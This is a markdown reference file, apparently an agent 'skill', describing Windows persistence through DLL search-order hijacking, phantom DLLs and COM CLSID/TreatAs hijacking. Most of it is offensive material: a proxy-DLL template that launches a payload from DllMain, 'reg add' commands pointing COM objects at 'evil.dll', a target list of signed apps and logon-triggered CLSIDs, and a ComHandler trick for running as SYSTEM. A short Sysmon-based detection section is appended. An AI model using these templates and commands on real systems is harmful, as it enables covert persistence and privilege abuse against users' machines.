---
name: dll-hijacking-com-persistence
description: DLL search order hijacking + COM object hijacking for persistence -- CLSID/TreatAs registry replacement, DLL sideloading via known-vulnerable apps, hijacklibs.net reference.
metadata:
  type: reference
---

# DLL Hijacking + COM Hijacking Persistence

Two persistence / code execution techniques that abuse Windows' DLL and COM object resolution
order to load attacker-controlled code when a legitimate application starts.

## DLL Search Order Hijacking (DLL Sideloading)

### How Windows Finds DLLs

When a PE calls `LoadLibrary("version.dll")`, Windows searches in this order:

```
1. Known DLLs registry key (HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs)
2. Application directory (where the .exe lives)
3. System directory (C:\Windows\System32)
4. 16-bit system directory (C:\Windows\System)
5. Windows directory (C:\Windows)
6. Current working directory
7. PATH environment variable directories
```

If a DLL is NOT in KnownDLLs, placing a malicious DLL with the same name in the application
directory (step 2) makes it load before the legitimate system copy (step 3).

### Attack Pattern

```
1. Find a signed, auto-starting application that loads a DLL not in KnownDLLs
2. Create a proxy DLL with the same name that:
   a. Exports all functions the app needs (forwarding to the real DLL)
   b. Runs payload in DllMain or a hijacked export
3. Place the proxy DLL in the application's directory
4. Application starts → loads your DLL → payload executes as the app's user
```

### Proxy DLL Template

```cpp
// version_proxy.dll -- forwards all exports to real version.dll
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW")

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // payload here
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    }
    return TRUE;
}
```

### Known Vulnerable Applications

Reference: https://hijacklibs.net/

Common sideloading targets (signed apps that load hijackable DLLs):

| Application              | Hijackable DLL      | Notes                           |
|--------------------------|---------------------|---------------------------------|
| Microsoft Teams          | `version.dll`       | Auto-starts, user-writable dir  |
| Slack                    | `winmm.dll`         | User-installed                  |
| OneDrive                 | `dbghelp.dll`       | Auto-starts                     |
| Discord                  | `version.dll`       | User-writable AppData path      |
| Visual Studio Code       | `profapi.dll`       | Dev machines                    |
| OBS Studio               | Various             | Content creator targets         |
| Adobe products           | Various             | Common on workstations          |

### Phantom DLL Hijacking

Some applications try to load DLLs that don't exist on the system at all. If you create
a DLL with that name in the search path, it loads. These are even stealthier because there's
no legitimate DLL to proxy -- yours is the only copy.

```
Example: application loads "wer.dll" looking for Windows Error Reporting,
but wer.dll doesn't exist on some Windows versions.
Drop your wer.dll → loaded without any export forwarding needed.
```

## COM Hijacking

### How COM Resolution Works

When code calls `CoCreateInstance(CLSID_SomeObject, ...)`, the COM runtime looks up the
CLSID in the registry to find the DLL or EXE that implements it:

```
HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32  (DLL, per-user -- checked FIRST)
HKCR\CLSID\{CLSID}\InprocServer32                    (DLL, machine-wide)
HKCR\CLSID\{CLSID}\LocalServer32                     (EXE, machine-wide)
```

Because `HKCU` is checked before `HKCR`, a non-admin user can redirect any COM object to
their own DLL by creating the HKCU key.

### CLSID Hijack

```cmd
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /d "C:\payload\evil.dll" /f
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /v ThreadingModel /d "Both" /f
```

Next time anything calls `CoCreateInstance` with that CLSID, `evil.dll` loads.

### TreatAs Hijack

The `TreatAs` subkey redirects one CLSID to another:

```cmd
reg add "HKCU\Software\Classes\CLSID\{TargetCLSID}\TreatAs" /ve /d "{AttackerCLSID}" /f
reg add "HKCU\Software\Classes\CLSID\{AttackerCLSID}\InprocServer32" /ve /d "evil.dll" /f
```

### High-Value COM Targets for Persistence

CLSIDs instantiated on logon or by scheduled tasks:

| CLSID                                 | Description                    | Trigger       |
|---------------------------------------|--------------------------------|---------------|
| `{0358b920-0ac7-461f-98f4-58e32cd89148}` | Shell Task Scheduler        | On logon      |
| `{BCDE0395-E52F-467C-8E3D-C4579291692E}` | MMDeviceEnumerator          | Audio init    |
| `{4590F811-1D3A-11D0-891F-00AA004B2E24}` | WBEM Locator               | WMI queries   |
| `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}` | Shell Folder Views          | Explorer start|

### Scheduled Task COM Handler

Scheduled tasks can use `<ComHandler>` instead of `<Exec>` to run a COM object:

```xml
<Actions>
  <ComHandler>
    <ClassId>{hijacked-CLSID}</ClassId>
  </ComHandler>
</Actions>
```

The task runs as SYSTEM → your COM DLL loads as SYSTEM.

## Detection

### DLL Hijacking

- Compare loaded DLL paths against expected system paths (is `version.dll` coming from
  `C:\Users\...` instead of `C:\Windows\System32`?)
- Unsigned DLLs loaded by signed applications
- DLL in application directory with same name as a system DLL
- Sysmon Event ID 7 (ImageLoaded): alert on known sideloading DLL names from non-system paths

### COM Hijacking

- Monitor `HKCU\Software\Classes\CLSID` for new InprocServer32 or TreatAs keys
- Compare HKCU CLSID entries against HKCR baseline
- Sysmon Event ID 12/13 (Registry): creation/modification of CLSID subkeys under HKCU
- Any InprocServer32 pointing outside `C:\Windows\` or `C:\Program Files\` is suspicious

## Related Skills

- `lolbas-living-off-land` -- DLL hijacking via legitimate binaries
- `windows-uac-bypass-registry` -- some UAC bypasses use COM hijacking
- `pe-injection-remote` -- DLL injection into running processes
